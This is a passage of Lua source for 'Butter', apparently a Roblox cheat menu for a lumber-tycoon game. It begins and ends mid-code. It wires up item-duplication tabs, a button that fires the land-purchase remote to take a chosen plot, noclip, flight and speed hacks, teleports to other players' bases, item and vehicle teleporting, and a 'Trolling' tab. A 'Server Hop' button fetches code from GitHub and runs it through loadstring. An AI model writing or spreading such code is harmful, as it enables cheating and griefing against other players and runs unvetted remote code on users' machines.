         if v:FindFirstChild("Owner") and v:FindFirstChild("WoodSection") then
             v.WoodSection.Size = Vector3.new(1, 1, 1)
         end
      end
  end
  --#endregion


   --#region cam
  camSprintKey = Enum.KeyCode.LeftShift

  localPlayer = game.Players.LocalPlayer

  Camera = game.Workspace.CurrentCamera

  UserInputService = game:GetService("UserInputService")


  movePosition = Vector2.new(0,0)
  moveDirection = Vector3.new(0,0,0)

  targetMovePosition = movePosition

  Y_Sensitivity = 300;
  X_Sensitivity = 300;

  lastRightButtonDown = Vector2.new(0,0)
  rightMouseButtonDown = false

  targetFOV = 70

  sprinting = false;
  sprintingSpeed = 3;

  keysDown = {}

  moveKeys = {
    [Enum.KeyCode.D] = Vector3.new(1,0,0),
    [Enum.KeyCode.A] = Vector3.new(-1,0,0),
    [Enum.KeyCode.S] = Vector3.new(0,0,1),
    [Enum.KeyCode.W] = Vector3.new(0,0,-1),
    --[Enum.KeyCode.E] = Vector3.new(0,1,0),
    --[Enum.KeyCode.Q] = Vector3.new(0,-1,0)
  }

  Tweenn = function(a,b,d)
  if t == 1 then
    return b
  else
    if tonumber(a) then
      return a * (1-d) + (b*d)
    else
      return a:Lerp(b,d);
    end
  end
  end

  ClampVector3 = function(x,min,max)

  return
  Vector3.new(
  math.clamp(x.X,min.X,max.X),
  math.clamp(x.Y,min.Y,max.Y),
  math.clamp(x.Z,min.Z,max.Z)
  )

  end


  UserInputService.InputChanged:connect(function(inputObject)
  if inputObject.UserInputType == Enum.UserInputType.MouseMovement then
  movePosition = movePosition + Vector2.new(inputObject.Delta.x,inputObject.Delta.y)
  end
  end)

  CalculateMovement = function()
  newMovement = Vector3.new(0,0,0)
  for i,v in pairs(keysDown) do
  newMovement = newMovement + (moveKeys[i] or Vector3.new(0,0,0))
  end
  return newMovement
  end

  Round = function(num, numDecimalPlaces)
  return math.floor((num/numDecimalPlaces) + .5)*numDecimalPlaces
  end

  Input = function(input,gameProcessed)
  if moveKeys[input.KeyCode] then
  if input.UserInputState == Enum.UserInputState.Begin then
  keysDown[input.KeyCode] = true
  elseif input.UserInputState == Enum.UserInputState.End then
  keysDown[input.KeyCode] = nil
  end
  else
  if input.UserInputState == Enum.UserInputState.Begin then
  if input.UserInputType == Enum.UserInputType.MouseButton2 then
  rightMouseButtonDown = true
  lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
  UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
  elseif input.KeyCode == Enum.KeyCode.Z then
  targetFOV = 20
  elseif input.KeyCode == camSprintKey then
  sprinting = true
  end
  else
  if input.UserInputType == Enum.UserInputType.MouseButton2 then
  rightMouseButtonDown = false
  UserInputService.MouseBehavior = Enum.MouseBehavior.Default
  elseif input.KeyCode == Enum.KeyCode.Z then
  targetFOV = 70
  elseif input.KeyCode == camSprintKey then
  sprinting = false
  end
  end
  end
  end

  Mouse.WheelForward:connect(function()
  Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(0,0,-5)
  end)

  Mouse.WheelBackward:connect(function()
  Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(-0,0,5)
  end)

  UserInputService.InputBegan:connect(Input)
  UserInputService.InputEnded:connect(Input)


  function camon()
  Toggled = true
  Camera.CameraType = Enum.CameraType.Scriptable
  game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
  end


  function camoff()
  Toggled = false
  game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
  game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
  game.Workspace.CurrentCamera.CameraType = "Custom"
  end


  game:GetService("RunService").RenderStepped:Connect(function()
  if Toggled then
  mouseTarget = Mouse.Hit

  targetMovePosition = movePosition
  Camera.CoordinateFrame = CFrame.new(Camera.CoordinateFrame.p) * CFrame.fromEulerAnglesYXZ(-targetMovePosition.Y/Y_Sensitivity ,-targetMovePosition.X/X_Sensitivity, 0) * CFrame.new(CalculateMovement() * ((({[true]=sprintingSpeed})[sprinting]) or .5) )
  Camera.FieldOfView = Tweenn(Camera.FieldOfView,targetFOV,.5)
  if rightMouseButtonDown then
  UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
  movePosition = movePosition - (lastRightButtonDown - Vector2.new(Mouse.X,Mouse.Y))
  lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
  end
  end
  end)
  --#endregion


  --#region Fix Names
 function fixnames()
 for i,v in pairs(game:GetService("Workspace").PlayerModels:GetDescendants()) do
     if v.Name == "Model" and v:FindFirstChild("ItemName") then
         v.Name = v.ItemName.Value
     end
 end
 end
 --#endregion

  --#endregion


  --#region Save stuff

  local HttpService = game:GetService("HttpService")

  local userinfo = {}

  local configsuccess, result = pcall(function()
      userinfo = HttpService:JSONDecode(readfile("Butterv1.lua"))
  end)


  local rgbthin = userinfo["rgbthin"] or false
  local keytoc = userinfo["keytoc"] or "RightShift"
  local flykey = userinfo["flykey"] or "Q"
  local daystuff = userinfo["daystuff"] or false
  local nofogst = userinfo["nofogst"] or false
  local Flystuff = userinfo["Flystuff"] or false
  local FlySpeed = userinfo["FlySpeed"] or 150
  local SprintSpeednums = userinfo["SprintSpeednums"] or 65
  local Fovnum = userinfo["Fovnum"] or 70
  local TheR = userinfo["TheR"] or 0
  local TheG = userinfo["TheG"] or 255
  local TheB = userinfo["TheB"] or 255

  if configsuccess then
      print("Configuration loaded successfully.")
  else
      print("Configuration file error. Fixing...")
      if isfile("Butterv1.lua") then
          delfile("Butterv1.lua")
      end
      task.wait()
      writefile("Butterv1.lua", HttpService:JSONEncode(userinfo))
  end

  function SaveSettings()
      userinfo["rgbthin"] = rgbthin
      userinfo["keytoc"] = keytoc
      userinfo["flykey"] = flykey
      userinfo["daystuff"] = daystuff
      userinfo["nightstuff"] = nightstuff
      userinfo["nofogst"] = nofogst
      userinfo["Flystuff"] = Flystuff
      userinfo["FlySpeed"] = FlySpeed
      userinfo["SprintSpeednums"] = SprintSpeednums
      userinfo["TheR"] = TheR
      userinfo["TheG"] = TheG
      userinfo["TheB"] = TheB
      userinfo["Fovnum"] = Fovnum
      writefile("Butterv1.lua", HttpService:JSONEncode(userinfo))
  end

  GameMenuTheme(Color3.fromRGB(25, 25, 25), Color3.fromRGB(TheR,TheG,TheB))

  --#region Green thing
  workspace.Effects.ChildAdded:Connect(function(child)
     if child:IsA("Model") and child.Name == "StructureModel" then
         for i,v in pairs(child:GetDescendants()) do
             if v:IsA("BasePart") then
                 v.Color = Color3.fromRGB(TheR, TheG, TheB)
             end
         end
     end
  end)

  workspace.DescendantAdded:Connect(function(v)
     if v.Name == "Cut" then
         v.Color = Color3.fromRGB(TheR, TheG, TheB)
     end
 end)
 --#endregion


  --#region Set Cord
  function SetCordFun()
     local SetCordval = Instance.new("Part")

     SetCordval.Name = "Cords"
     SetCordval.Anchored = true
     SetCordval.CanCollide = false
     SetCordval.Transparency = 0
     SetCordval.Shape = "Ball"
     SetCordval.Material = "Air"
     SetCordval.Size = Vector3.new(3,3,3)
     SetCordval.Color = Color3.fromRGB(TheR, TheG, TheB)
     SetCordval.Position = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame.p
     SetCordval.Parent = workspace
  end
 --#endregion


  --#region Slot Names
 if not isfile('ButtersSlotNames.cfg') then

     local DefaultSlotNames = {}

     DefaultSlotNames[tostring(Player)] = {

     Slot1Val = 'Slot 1',
     Slot2Val = 'Slot 2',
     Slot3Val = 'Slot 3',
     Slot4Val = 'Slot 4',
     Slot5Val = 'Slot 5',
     Slot6Val = 'Slot 6'

     }

     writefile('ButtersSlotNames.cfg', HttpService:JSONEncode(DefaultSlotNames))

   end

   local ButtersSlotNames = HttpService:JSONDecode(readfile('ButtersSlotNames.cfg'))

   local DoesPlayerExist = ButtersSlotNames[tostring(Player)] ~= nil

   if not DoesPlayerExist then

      local DefaultSlotNames = {}

      DefaultSlotNames = {

          Slot1Val = 'Slot 1',
          Slot2Val = 'Slot 2',
          Slot3Val = 'Slot 3',
          Slot4Val = 'Slot 4',
          Slot5Val = 'Slot 5',
          Slot6Val = 'Slot 6'
      }

      local SlotNamesOld = HttpService:JSONDecode(readfile('ButtersSlotNames.cfg'))
      SlotNamesOld[tostring(Player)] = DefaultSlotNames
      writefile('ButtersSlotNames.cfg', HttpService:JSONEncode(SlotNamesOld))

   end


   local SlotNamesOld = HttpService:JSONDecode(readfile('ButtersSlotNames.cfg'))
 --#endregion


  --#region Hard Dragger
 function Dragger()
     game.Workspace.ChildAdded:connect(function(a)
         if a.Name == "Dragger" then
             a.Color = Color3.fromRGB(TheR, TheG, TheB)
             local bg = a:WaitForChild("BodyGyro")
             local bp = a:WaitForChild("BodyPosition")
             repeat
                 if CustomDragger then
                     task.wait()
                     bp.P = 120000
                     bp.D = 1000
                     bp.maxForce = Vector3.new(math.huge,math.huge,math.huge)
                     bg.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                 else
                     wait()
                     bp.P = 10000
                     bp.D = 800
                     bp.maxForce = Vector3.new(17000, 17000, 17000)
                     bg.maxTorque = Vector3.new(200, 200, 200)
                 end
             until not a
         end
     end)
 end
 --#endregion


  SaveSettings()
  --#endregion


  --#region UI
    if getgenv().gay then NameT = "Butter│Admin" else NameT = "Butter" end

    local ui = library:new(NameT)

    local Home = ui:Tab('Home','6035145364')

    local Player = ui:Tab('Player','6034287594')

    local WorldTab = ui:Tab('World','6034287522')

    local AutoBuyg = ui:Tab('Auto Buy','6031265983') -- had to put a G

    local DupeTab = ui:Tab('Dupe','6035053278')

    local Slot = ui:Tab('Slot','6034333276')

    local WoodTab = ui:Tab('Wood','6034503369')

    local AutoBuild = ui:Tab('AutoFill','6035067834')

    local ItemTab = ui:Tab('Item','11145825488')

    local Sortertab = ui:Tab('Sorter','11145825488')

    local Vehicle = ui:Tab('Vehicle','6034754441')

    local Trollingtab = ui:Tab('Trolling','6034687957')

    local Settingtab = ui:Tab('Settings','6031280882')

    --#region section tab

    local Home1 = Home:section('Credits',true)
    local Home2 = Home:section('Settings',true)

    local Player1 = Player:section('Movement',true)
    local Player2 = Player:section('Misc',true)



    --local AutoBuild1 = AutoBuild:section('Save Build',true)
    --local AutoBuild5 = AutoBuild:section('Load Build',true)
    local AutoBuild2 = AutoBuild:section('Studio Build ',true)
    local AutoBuild3 = AutoBuild:section('Build',true)
    local AutoBuild4 = AutoBuild:section('Build Help',true)

    local WorldTab0 = WorldTab:section('Teleports',true)
    local WorldTab1 = WorldTab:section('World',true)
    local WorldTab2 = WorldTab:section('Water',true)

    local Slot1 = Slot:section('Fast load',true)
    local Slot2 = Slot:section('slot',true)
    local Slot3 = Slot:section('Land Claim',true)

    local Vehicle1 = Vehicle:section('Vehicle',true)
    local Vehicle2 = Vehicle:section('Vehicle Spawner',true)

    local Dupetab01 = DupeTab:section('Mimir Dupe',true)
    local Dupetab02 = DupeTab:section('Old Mimir Dupe',true)
    local Dupetab0 = DupeTab:section('Time Dupe',true)
    local Dupetab1 = DupeTab:section('AxeDupe',true)
    local Dupetab2 = DupeTab:section('PowerDupe',true)
    local Dupetab3 = DupeTab:section('SoldSign Dupe',true)

    local Trollingtab1 = Trollingtab:section('Trolling',true)

    local ItemTab1 = ItemTab:section('Teleport',true)
    local ItemTab2 = ItemTab:section('Options',true)

    local Sortertab1 = Sortertab:section('Sorter',true)

    local Autobuy1 = AutoBuyg:section('AutoBuy',true)
    local Autobuy2 = AutoBuyg:section('Buying Misc',true)

    local Woodtab1 = WoodTab:section('Get tree',true)
    local Woodtab2 = WoodTab:section('Tree',true)
    local Woodtab3 = WoodTab:section('Mod stuff',true)
    local Woodtab4 = WoodTab:section('Tree help',true)

    local Settingtab1 = Settingtab:section('Config',true)
    local Settingtab2 = Settingtab:section('Colors',true)
    local Settingtab3 = Settingtab:section('Slot Names',true)

    --#endregion

  --#endregion


  --#region Home
    local Label = Home1:Label("Leader/Maker of project Kissbox.")
    local Label = Home1:Label("ALL of the developers that helped Butter")
    local Label = Home1:Label("Applebox, silentben8x, tip,")
    local Label = Home1:Label("Made sorter/helped with Mod wood")
    local Label = Home1:Label("billybob123")
    local Label = Home1:Label("Beta testers Gamer,")

    Home2:Toggle('Glow', '', rgbthin, function(Value)

            if Value == "" then
                glow.Visible = true
            else
                rgbthin = Value
                glow.Visible = Value
                SaveSettings()
            end
    end)

    if rgbthin == false then
        glow.Visible = false
    end

    Home2:Keybind("Toggle UI", Enum.KeyCode[keytoc], function(Value)
        keytoc = Value
        ToggleUILib()
        SaveSettings()
    end)

    Home2:Button('Rejoin', function()
        game:GetService("TeleportService"):Teleport(game.PlaceId,game:GetService("Players").LocalPlayer)
    end)

    Home2:Button('Server Hop', function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/ServerHop.txt'))()
    end)

    glowong()

  --#endregion


  --#region Player tab
    getgenv().ison = true

    Nspeed = 16

    NSspeed = 65

    Player1:Slider('Walkspeed', 'WalspeedSlider', 16, 16, 250,false, function(Value)
    if getgenv().ison == true then
      Nspeed = Value
      getgenv().Speed = Value
      Walkspeed()
    else
      getgenv().SprintSpeed = getgenv().Speed
      Nspeed = Value
      getgenv().Speed = Value
      Walkspeed()
    end
    end)


    getgenv().SprintSpeed = SprintSpeednums

    SprintSpeedsets = Player1:Slider('SprintSpeed', 'SSpeed', SprintSpeednums, 16, 250,false, function(Value)
    SprintSpeednums = Value
    NSspeed = Value
    if getgenv().ison == false then

    else
      getgenv().SprintSpeed = Value
    end
    end)

    SprintSpeedsets:SetValue(SprintSpeednums)


    local userInput = game:GetService("UserInputService")

    local function beginSprint(input, gameProcessed)

      if not gameProcessed then

        if input.UserInputType == Enum.UserInputType.Keyboard then

          local keycode = input.KeyCode

          if keycode == Enum.KeyCode.LeftShift then
            if not game:GetService("Players").LocalPlayer.PlayerGui.ItemDraggingGUI.CanRotate.Visible then
              getgenv().Speed = getgenv().SprintSpeed
              Walkspeed()
            else
              getgenv().Speed = 0
              Walkspeed()
            end
          end

        end

      end
    end





    local function endSprint(input, gameProcessed)

      if not gameProcessed then

        if input.UserInputType == Enum.UserInputType.Keyboard then

          local keycode = input.KeyCode

          if keycode == Enum.KeyCode.LeftShift then

            getgenv().Speed = Nspeed
            Walkspeed()
          end

        end

      end

    end



    userInput.InputBegan:Connect(beginSprint)

    userInput.InputEnded:Connect(endSprint)

    Player1:Slider('Jump Power', 'JumpPowerSlider', 50, 50, 1000,false, function(Value)
    JumpPower(Value)
    end)

    maxspeed = FlySpeed

    flyspeedsets = Player1:Slider('Flight Speed', 'Flight Slider', FlySpeed, 50, 250, false, function(Value)
    maxspeed = Value

    FlySpeed = Value
    SaveSettings()
    end)
    flyspeedsets:SetValue(FlySpeed)


    game:GetService'Workspace'.Camera.FieldOfView = Fovnum

    Player1:Slider('FOV', '', Fovnum, 70, 250, false, function(Value)
      game:GetService'Workspace'.Camera.FieldOfView = Value
      Fovnum = Value
      SaveSettings()
    end)


    Player1:Toggle('Sprint', '', true, function(Value)
    getgenv().ison = Value
    if not Value then
      getgenv().SprintSpeed = Nspeed
    end

    if Value then
      getgenv().SprintSpeed = NSspeed
    end
    end)

    FlyingEnabled = Flystuff

    Player1:Toggle('Flight' ,'', Flystuff, function(Value)
      if Value == "" then
          FlyingEnabled = true
      else
          Flystuff = Value
          FlyingEnabled = Value
          SaveSettings()
      end
    end)

    Player1:Toggle('Infinite Jump', 'infj', false, function(Value)
    InfiniteJump(Value)
    end)


    Flyingkey = flykey

    Player1:Keybind("Flight keybind", Enum.KeyCode[flykey], function(Value)
    flykey = Value
    Flyingkey = string.lower(Value)
    SaveSettings()
    end)


    Player1:Toggle('NoClip', '', false, function(Value)
    NoClip(Value)
    end)


    Player2:Toggle('Anti AFK', '', true, function(Value)
    AntiAFK(Value)
    end)


    Player2:Toggle('Light', '', false, function(Value)
    Light(Value)
    end)

    Player2:Button('Safe death', function()
    workspace.Gravity = 100000
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = axepart.CFrame
    workspace.Gravity = 196.2
    end)

    Player2:Toggle('Custom Dragger', '', false, function(Value)
    CustomDragger = Value
    end)
    Dragger()

    Player2:Button('BTools', function()
    BTools()
    end)
    --#endregion


  --#region World Tab

  --#region Lighting Change
  game.Lighting.Changed:Connect(function()
      if AlwaysDay then
          if AlwaysNight then return end
          game.Lighting.TimeOfDay = "12:00:00"
          game.Lighting.SunPos.Value = 1

          game:GetService("Lighting").Ambient = Color3.new(1, 1, 1)
          game:GetService("Lighting").ColorShift_Bottom = Color3.new(1, 1, 1)
          game:GetService("Lighting").ColorShift_Top = Color3.new(1, 1, 1)
      end
      if AlwaysNight then
          if AlwaysDay then return end
          game.Lighting.TimeOfDay = "00:00:00"
          game.Lighting.SunPos.Value = -1
      end
      if NoFog then
          game.Lighting.FogEnd = 100000
      end
  end)
  --#endregion


  --#region Teleports tab
      WorldTab0:Dropdown("Teleport to waypoints", "Select...", {"The Den", "Lighthouse", "Safari", "Bridge", "Bob's Shack", "EndTimes Cave", "The Swamp", "The Cabin", "Volcano", "Boxed Cars", "Tiaga Peak", "Land Store", "Link's Logic", "Palm Island", "Palm Island 2", "Palm Island 3", "Fine Art Shop", "SnowGlow Biome", "Cave", "Shrine Of Sight", "Fancy Furnishings", "Docks", "Strange Man", "Wood Dropoff", "Snow Biome", "Wood RUs", "Green Box", "Spawn", "Cherry Meadow", "Bird Cave",}, function(Value)
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = WaypointsPositions[Value]
      return
      end)

     dropdownTTP = WorldTab0:Dropdown("Teleport to Player", "Select...", playerList, function(Value)
         TeleportToPlayer(Value)
     end)

     dropdownTTPB = WorldTab0:Dropdown("Teleport to Player Base", "Select...", playerList, function(Value)
         TeleportToBase(Value)
     end)
  --#endregion


  --#region day, Night and no fog
  AlwaysDay = daystuff
  NoFog = nofogst

  daythin = WorldTab1:Toggle('Day', '', daystuff, function(Value)
      if Value == "" then
          AlwaysDay = true
      else
          daystuff = Value
          AlwaysDay = Value
          SaveSettings()
      end
  end)


  WorldTab1:Toggle('Night', '', false, function(Value)
     AlwaysNight = Value
  end)


  WorldTab1:Toggle('No Fog', '', nofogst, function(Value)
      if Value == "" then
          NoFog = true
      else
          nofogst = Value
          NoFog = Value
          SaveSettings()
      end
  end)
  --#endregion


   --#region other
  WorldTab1:Toggle('Shadows', '', true, function(Value)
      game:GetService("Lighting").GlobalShadows = Value
  end)

  WorldTab1:Toggle('Bridge', '', false, function(Value)
      BridgeDown(Value)
  end)


  WorldTab1:Button('Better Graphics', function()
      BetterG()
  end)

  WorldTab2:Button('Better Water', function()
      for i,v in next, game.Workspace:GetDescendants() do
          if v:IsA("Part") and v.Name == "SeaSand" then
              v.Size = Vector3.new(2048, 60, 2048)
          end
      end

      for i,v in next, game.Workspace:GetDescendants() do
          if v:IsA("Part") and v.Name == "Water" then
              v.Size = Vector3.new(20480, 6, 20080)
              game.Workspace.Terrain:fillBlock(v.CFrame, v.Size, Enum.Material.Water)
              v:Destroy()
          end
      end
  end)

  WorldTab2:Toggle('Walk On Water', '', false, function(Value)
      WalkOnWater(Value)
  end)

  WorldTab2:Toggle('Remove Water', '', false, function(Value)
      RemoveWater(Value)
  end)
  --#endregion

  --#endregion


  --#region Slot tab
    slottt = Slot1:Slider('Slot Number', '', 1, 1, 6,false, function(Value)
    slot2NUM = Value
    end)

    skil = Slot1:Toggle('Fast Load', '', false, function(state)
    skipLoading = state
    end)

    Slot1:Button('Load Base', function()
    LoadSlot(slot2NUM)
    end)

    Slot2:Button('Free Land', function()
    FreeLand()
    end)

    Slot2:Button('Max Land', function()
    MaxLand()
    end)

    Slot2:Toggle('LandArt', '', false, function(Value)
    LandArt(Value)
    end)

    Slot2:Button('Sell Sold Sign', function()
    SellSoldSign()
    end)

    Slot3:Dropdown("Select Land", "Select...", {"1", "2", "3", "4", "5", "6", "7", "8","9",}, function(Value)
     if LandPart and Dupehighlight then
     pcall(function()
      LandPart.Highlight:Destroy()
     end)
     end
      landToTake = tonumber(Value)
      LandPart = workspace.Properties:GetChildren()[landToTake].OriginSquare
      Dupehighlight = Instance.new("Highlight") Dupehighlight.Parent = LandPart Dupehighlight.FillColor = Color3.fromRGB(0,255,0)
     end)

     Slot3:Button('Take Land', function()
      game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(LandPart.Parent,LandPart.Position) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LandPart.CFrame + Vector3.new(0,2,0)
      wait(0.3)
      LandPart.Highlight:Destroy()
     end)
    --#endregion


  --#region AutoBuild tab


  --AutoBuild0:Button('Load Preview', function()

  --end)


  --AutoBuild0:Button('Unload Preview', function()

  --end)

  --[[dropdownCPP = AutoBuild1:Dropdown("Player Copy", "Select...", playerList, function(Value)
    PlayerCopy = Value
  end)


  AutoBuild1:Textbox('File name', '', "", function(Value)
    FileName = Value
  end)


  AutoBuild1:Button('Make File', function()
    CopyBase(FileName,PlayerCopy)
  end)



  AutoBuild5:Textbox('File name', '', "", function(Value)
    FileName2 = Value
  end)

  AutoBuild5:Button('Load File', function()
    LoadBaseFile(FileName2)
  end)--]]





  AutoBuild2:Button('Load Preview', function()
    LoadPreview()
  end)

  AutoBuild2:Button('Build Preview', function()
    fillPreviewsWithColors(0.3)
  end)

  AutoBuild2:Button('Unload Preview', function()
    PreviewF:ClearAllChildren()
  end)





  AutoBuild3:Toggle('Lasso Wood tool', '', false, function(Value)
      getgenv().isonlooze = Value
      lassoTpcheck()
  end)

  AutoBuild3:Toggle('Automatically get the best speed', '', false, function(Value)
     WoodTPspeed = GetPing()
  end)

  AutoBuild3:Slider('Speed', '', 0.3, 0.1, 1,true, function(Value)
     WoodTPspeed = Value
  end)

  WoodTPspeed = 0.3

  dropdownABP = AutoBuild3:Dropdown("Player", "Select...", playerList, function(Value)
      APlayer = Value
  end)

  APlayer = game:GetService("Players").LocalPlayer.Name


  AutoBuild3:Button('Fill Blueprints', function()
      SelectionTpWOOD(WoodTPspeed,APlayer)
  end)

  AutoBuild3:Button("Deselect items", function()
      delallselections()
  end)



  AutoBuild4:Toggle('Select tool', '', false, function(Value)
      getgenv().GetBPs = Value
      getgenv().isonlooze = Value
      lassoTpcheck()
  end)

  AutoBuild4:Button("Deselect items", function()
    delallselections()
  end)

  AutoBuild4:Button("Destroy items", function()
      Destroybp()
  end)


      --#endregion


  --#region Vehicle tab
      Vehicle1:Slider('Vehicle speed', '', 1, 1, 10,false, function(Value)
      VehicleSpeed(Value)
      end)


      dropdownTVTP = Vehicle1:Dropdown('Teleport Vehicle to Player', "Select...", playerList, function(v)
      carTP(v.Character.HumanoidRootPart.CFrame)
      end)


      dropdownTVTPP = Vehicle1:Dropdown("Teleport Vehicle to Player's Plot", "Select...", playerList, function(ve)
      for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
        if v:FindFirstChild("Owner") then
          if v.Owner.Value == ve then
            carTP(v.OriginSquare.CFrame)
          end
        end
      end
      end)

      Vehicle1:Toggle('Vehicle Fly', '', false, function(v)
      if v == true then
        player = game.Players.LocalPlayer
        humanoid = player.Character.Humanoid
        if humanoid.Seated then
          local CurrentSeat = player.Character.Humanoid.SeatPart
          if CurrentSeat and CurrentSeat.Parent.Type.Value == "Vehicle" then
            NOFLY()
            wait()
            sFLY(true)
          end
        end
      else
        NOFLY()
      end
      end)

      Vehicle1:Slider('Vehicle Fly Speed', '', 16, 16, 250,false, function(v)
      iyflyspeed = v
      vehicleflyspeed = v
      end)


      Vehicle2:Dropdown('Car Colors', "Select...", {"Medium stone grey","Sand green","Sand red","Faded green","Dark grey metallic","Dark grey","Earth yellow","Earth orange","Silver","Brick yellow","Dark red","Hot pink",}, function(Value)
      SelectedSpawnColor = tostring(Value)
      return
      end)

      Vehicle2:Button('Start Vehicle Spawner', function()
      notifications:message{
        Title = "Butter",
        Description = "butter",
        Icon = 6023426926
      }
      VehicleSpawner(SelectedSpawnColor)
      end)

      Vehicle2:Button('Abort Vehicle Spawner', function()
      AbortVehicleSpawner = true
      end)
      --#endregion


  --#region Item TP(s)
  --ItemTab1:Slider('Items speed', '', 10, 10, 35,false, function(Value)
  --SelectionNUM = Value
  --end)

  --SelectionNUM = 10


  ItemTab1:Toggle('Lasso tool', '', false, function(Value)
  getgenv().isonlooze = Value
  lassoTpcheck()
  end)

  ItemTab1:Toggle('Selection tool', '', false, function(Value)
  getgenv().selectionv2 = Value
  selectionv2(DropOwner)
  end)

  ItemTab1:Toggle('Item click to teleport', '', false, function(Value)
  ClickTp = Value
  ClickToTP()
  end)

  ItemTab1:Slider('Speed', '', 0.3, 0.1, 0.5,true, function(Value)
  tpitemspeedV = Value
  end)


  ItemTab1:Toggle('Set coordinates', '', false, function(Value)
  cordisset = Value
  if Value then if Workspace:FindFirstChild("Cords") then Workspace.Cords:Destroy() end SetCordFun() else Workspace.Cords:Destroy() end
  end)


  ItemTab1:Button("Teleport Selected Item(s)", function()
  if cordisset then SelectionTp(tpitemspeedV,"Upwards",Workspace.Cords) else SelectionTp(tpitemspeedV,"Upwards",game:GetService("Players").LocalPlayer.Character.HumanoidRootPart) end
  end)


  DropOwner = game.Players.LocalPlayer.Character.Name


  ItemTab1:Button("Deselect items", function()
  delallselections()
  end)

  ItemTab2:Button("Countitems", function()
  notifications:message{
     Title = "Butter",
     Description = "Prees F9 to see results.",
     Icon = 6023426926
  }
  Countitems()
  end)

  getgenv().whendonetp = true
  ItemTab2:Toggle('Teleport to item when done', '', true, function(Value)
  getgenv().whendonetp = Value
  end)

  dropdownIO = ItemTab2:Dropdown('Item Owner', "Select...", playerList, function(Value)
  DropOwner = Value
  end)

  ItemTab2:Button("Make All wood 1x1", function()
  smallmodwood()
  end)

  ItemTab2:Button("Sell selected", function()
  SelectionTp(0.5,"Sideways")
  end)
  --#endregion


  --#region Sort

  Sortertab1:Slider('Length', '', 1, 1, 15,false, function(Value)
  XXXSort = Value
  end)

  Sortertab1:Slider('Height', '', 1, 1, 15,false, function(Value)
  YYYSort = Value
  end)

  Sortertab1:Slider('Width', '', 1, 1, 15,false, function(Value)
  ZZZSort = Value
  end)

  Sortertab1:Slider('Speed', '', 0.3, 0.1, 0.5,true, function(Value)
     TimesSort = Value
  end)

  Sortertab1:Toggle('Fast Teleport', '', false, function(Value)
     MikeTp = Value
  end)

  if getgenv().gay then
  Sortertab1:Toggle('Admin Teleport', '', false, function(Value)
     NRTP = Value
  end)
  end

  NRTP = false
  MikeTp = false

  sortPlayer = game.Players.LocalPlayer.Character.Name

  dropdownSP = Sortertab1:Dropdown("Player", "Select...", playerList, function(Value)
  sortPlayer = Value
  end)



  getgenv().sortsortcancel = false

  Sortertab1:Button("Stop", function()
  getgenv().sortsortcancel = true
  end)

  sortTPspeed = 0.1
  TimesSort = 0.3

 local Label = Sortertab1:Label("Butters")


 function sort()
 XXSort = XXXSort YYSort = YYYSort ZZSort = ZZZSort

 local partsorting, RRSort, sortstate, sortbox = nil, 0, 1 ,nil local tests = {} getgenv().sortsortcancel = false


         SortDown = Mouse.Button1Down:connect(function()

             SortSelection = Instance.new("SelectionBox")
             if not Mouse.Target then return end
             if sortstate== 1 and tostring(Mouse.Target) == "Square" then return end
             if sortstate == 1 and Mouse.Target.Name == "Main" or Mouse.Target.Name == "Cylinder" or Mouse.Target.Name == "WoodSection" then

             ItemNameVal = Mouse.Target.Name
             partsorting = Mouse.Target


             if partsorting.Parent:FindFirstChild("ItemName") and not NRTP then
                 FastTP = true
                 else
                 FastTP = false
             end

             if MikeTp then
                 FastTP = false
             end

             SortSelection.Color3 = Color3.fromRGB(TheR, TheG, TheB) SortSelection.Parent = Mouse.Target SortSelection.Adornee = SortSelection.Parent


             local MainItem = SortSelection.Adornee.Parent


             sortstate = 2

             wait(0.5)
             SortSelection:Destroy()

             sortbox = Instance.new("Part", Workspace)

             sortbox.Size = Vector3.new(((MainItem[ItemNameVal].Size.x + 0.1)*XXSort),MainItem[ItemNameVal].Size.y*YYSort,((MainItem[ItemNameVal].Size.z+ 0.1)*ZZSort)) sortbox.Color = Color3.fromRGB(TheR, TheG, TheB) sortbox.Transparency = 0.3 sortbox.CanCollide = false sortbox.Anchored = true sortbox.Material = "ForceField"

             Mouse.TargetFilter = sortbox

             while sortbox do
                 if sortstate ~= 3 and Mouse.Target and Mouse.Target.Parent then
                     local Mouseclick = Mouse.Hit

                         sortbox.Position = CFrame.new(Mouse.Hit.X+((XXSort/2)*MainItem[ItemNameVal].Size.x), Mouse.Hit.Y +((YYSort/2)*MainItem[ItemNameVal].Size.y + 0.01) , Mouse.Hit.z+((ZZSort/2)*MainItem[ItemNameVal].Size.z)) * Vector3.new(0,0.0,0)
                         wait()
                     end
                 wait()
             end


             elseif sortstate == 2 then

                 sortstate = 3

                 sorttertime = tick()

                 local cf = sortbox.CFrame - Vector3.new(sortbox.Size.X/2, sortbox.Size.Y/2, sortbox.Size.Z/2)

                 if partsorting.Name == ItemNameVal then
                     if partsorting.Parent.Parent.Name == "PlayerModels" then
                         if partsorting.Parent:FindFirstChild("Owner") and tostring(partsorting.Parent.Owner.Value) == sortPlayer then


                         for i,v in pairs(game:GetService("Workspace").PlayerModels:GetDescendants()) do
                             if v.Name == ItemNameVal then
                                 if v.Parent.Name == partsorting.Parent.Name then
                                     if v.Parent:FindFirstChild("Owner") and tostring(v.Parent.Owner.Value) == sortPlayer then
                                         if v.Color == partsorting.Color then

                                         table.insert(tests, v)

                                         if XXXSort * YYYSort * ZZZSort == #tests then break end
                                         end
                                     end
                                 end
                             end
                         end

                         if not FastTP then if not NRTP then camon() end end


                         for i,v in next, tests do

